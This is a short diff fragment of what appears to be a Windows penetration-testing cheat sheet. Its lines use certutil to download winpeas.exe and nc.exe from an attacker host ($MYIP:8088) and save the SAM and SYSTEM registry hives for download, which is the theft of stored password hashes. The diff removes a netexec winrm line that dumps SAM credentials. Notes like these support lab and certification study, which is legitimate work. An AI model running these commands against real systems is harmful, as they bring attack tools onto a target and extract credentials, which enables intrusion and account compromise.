@@ -561,8 +561,6 @@ powershell -c "certutil -urlcache -f http://$MYIP:8088/winpeas.exe C:\programdat
 powershell -c "certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe"
 
 [*] SAM
-nxc winrm $TARGET -u '$USERNAME' -p '$PASSWORD' --sam --dump-method powershell
-
 cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
 download SAM
 download SYSTEM
